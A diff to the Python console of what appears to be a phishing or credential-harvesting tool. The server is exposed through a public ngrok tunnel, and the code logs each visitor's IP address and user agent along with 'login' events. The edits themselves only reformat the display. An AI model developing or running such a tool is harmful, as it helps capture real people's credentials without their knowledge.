@@ -121,19 +121,30 @@ def start_server():
 
     Log.info('Creating ngrok tunnel...')
     ngrok.connect(8080)
-    Log.success('Ngrok tunnel opened:')
-    print(f"    Local URL: \t{colored(ngrok.get_tunnels()[0].config['addr'], 'cyan')}")
-    print(f"    Public URL: {colored(ngrok.get_tunnels()[0].public_url, 'cyan')}")
+    Log.success('Ngrok tunnel opened.')
+
+    table_data = []
+    table_data.append(['Local URL', colored(ngrok.get_tunnels()[0].config['addr'], 'cyan')])
+    table_data.append(['Public URL', colored(ngrok.get_tunnels()[0].public_url, 'cyan')])
+    banner_table = SingleTable(table_data)
+    banner_table.inner_heading_row_border = False
+    banner_table.title = '[ Server ]'
     
     ## Let server run until user stops it
     try:
-        print("\n\nSERVEROUTPUT: \n")
+        os.system('clear')
+        banner()
+        print(banner_table.table)
+        # print(f"    Local URL: \t{colored(ngrok.get_tunnels()[0].config['addr'], 'cyan')}")
+        # print(f"    Public URL: {colored(ngrok.get_tunnels()[0].public_url, 'cyan')}")
+
+        print("\nSERVEROUTPUT: \n")
         logfile = open('logs/serverlog.txt', 'w')
 
         for line in server.stdout:
             message = json.loads(line.split("[DataHandler]: ",1)[1])
-            if message['tag'] == 'connection':
-                sys.stdout.write(colored('New connection:', 'green') + '\n')
+            if message['tag'] == 'visitor':
+                sys.stdout.write(colored('New visitor:', 'green') + '\n')
                 sys.stdout.write('\tIP: \t\t' + colored(message['ip'], 'blue') + '\n')
                 sys.stdout.write('\tUseragent: \t' + colored(message['useragent'], 'blue') + '\n')
             if message['tag'] == 'login':
@@ -145,6 +156,7 @@ def start_server():
 
         server.wait()
     except KeyboardInterrupt:
+        os.system('clear')
         Log.info('Ctrl + C pressed, Killing server...')
         server.kill()
         shutil.rmtree('.server/public/')
